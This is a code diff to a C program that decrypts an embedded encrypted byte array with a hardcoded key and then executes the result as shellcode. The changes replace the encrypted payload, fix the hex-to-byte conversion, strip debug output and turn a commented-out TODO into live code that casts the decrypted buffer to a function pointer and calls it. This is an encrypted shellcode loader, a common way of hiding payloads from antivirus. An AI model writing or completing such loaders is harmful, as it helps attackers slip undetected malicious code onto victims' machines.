@@ -10,7 +10,7 @@
 #include <stdint.h>
 
 unsigned char code[] = \
-"\xc0\x72\xa3\x62\xba\xa6\x56\x55\x56\x3e\x42\x2b\x4f\x3c\xc9\x4f\xf6\x69\xb6\x3f\xa8\x6a\xfe\x48";
+"\xb2\xfc\xbc\x21\xbf\x23\xd1\x27\x1c\x5b\xb8\x35\x7d\xe9\x28\x48\x86\xb9\x4c\xb4\xb9\x78\xc9\x55\xd1\xda\xf0\x78\xd4\x1a\xd1\x42";
 
 const int BUFSIZE = 8;
 uint32_t KEY[] = {0xbe168aa1, 0x16c498a3, 0x5e87b018, 0x56de7805};
@@ -66,16 +66,16 @@ int chunk(const unsigned char *src, unsigned char **dest, const int len) {
 
 int finalize(unsigned char *src, unsigned char **dest, const int len) {
   int i = 0, j = 0, srclen = strlen(src);
-  char *tmp = *dest, buf[len];
+  char *tmp = *dest, buf[len + 1];
 
-  memset(buf, '\0', len);
   for (i = 0; i < srclen; i++) {
+    memset(buf, '\0', len + 1);
     for (j = 0; j < len; j++) {
       memset(&buf[j], src[i++], 1);
     }
     uint32_t num = strtoul(buf, NULL, 16);
-    printf("TEST: 0x%02x", num);
     *tmp++ = num;
+    i--;
   }
 
   return 0;
@@ -89,7 +89,6 @@ int main() {
 
   int beforeLength, chunkedLength, afterLength, finalLength;
   unsigned char *before, *chunked, *after, *token, *final;
-  int (*ret)() = (int(*)())code;
 
   beforeLength = strlen(code)*2;
   before = malloc(sizeof(unsigned char)*beforeLength + 1);
@@ -142,22 +141,19 @@ int main() {
 
   printf("[+] Decrypted (%i): %s\n", strlen(after)/2, after);
 
-
   finalLength = afterLength / 2;
   final = malloc(sizeof(unsigned char)*finalLength + 1);
   memset(final, '\0', finalLength);
   finalize(after, &final, 2);
   memset(&final[finalLength], '\0', 1);
 
-  printf("[+] Shellcode (%i): %08x\n", finalLength, final);
-
-// TODO: Write decrypted shellcode to 'code' and run 'ret()'
-//
-//  ret();
+  int (*ret)() = (int(*)())final;
+  ret();
 
   free(before);
   free(chunked);
   free(after);
+  free(final);
 
   return 0;
 }
